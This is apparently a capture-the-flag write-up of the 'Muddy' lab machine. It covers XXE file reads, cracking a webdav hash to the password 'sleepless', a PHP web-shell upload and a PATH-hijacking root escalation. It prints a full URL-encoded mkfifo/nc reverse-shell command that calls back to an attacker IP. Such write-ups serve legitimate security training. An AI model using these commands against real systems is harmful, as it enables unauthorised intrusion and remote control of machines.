Muddy

Target IP: 192.168.152.161

Scanning



There are eight TCP ports open on the target machine. I added muddy.ugc vhost inside /etc/hosts file.

Enumeration

Port 80: HTTP

The webpage above is displayed for this application. It seems be running WordPress 5.7.


Performing a directory search using the command gobuster dir -u http://muddy.ugc -w /usr/share/wordlists/dirb/big.txt -x php,html,txt returns the interesting result above. I performed wpscan for users and all plugins, but I did not find anything useful.

Port 8888: HTTP

The webpage above is displayed for this port. Googling the application name Ladon Service Catalog shows this application is vulnerable to XXE attacks.


The article above contains numerous XXE PoC that I will be testing on the target machine.

Exploitation


I made changes to the XXE PoC to test on the target machine. The payload above is to obtain the /etc/passwd file on the target machine.


And the target machine sent the /etc/passwd file in return. There are two users: rootand ian. Maybe I can obtain the SSH key of either users? But this did not work. Maybe I can identify the /webdav password? From enumeration, I know it is password locked.


And the server the credential administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0.


Using john, I cracked the password hash and obtained the result administrant:sleepless. Now I should be able to login to the /webdav application. Only the password file we retrieved was there.


I created a simple PHP web-shell and uploaded it to the webdav directory using curl.


And I can access my simple web-shell now. Time to upgrade it to a reverse shell connection.


I now have a foothold on the machine. I setup a listener on 8443, and gained a shell connection.

URL with payload used: http://muddy.ugc/webdav/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.173%208443%20%3E%2Ftmp%2Ff

Privilege Escalation


The wp-config.php contains the username and password hash.


A malicious netstat can be created with a reverse shell to obtain a root shell. The path also points to /dev/shm first where the malicious netstat can be placed at.


And now I have a reverse shell connection.
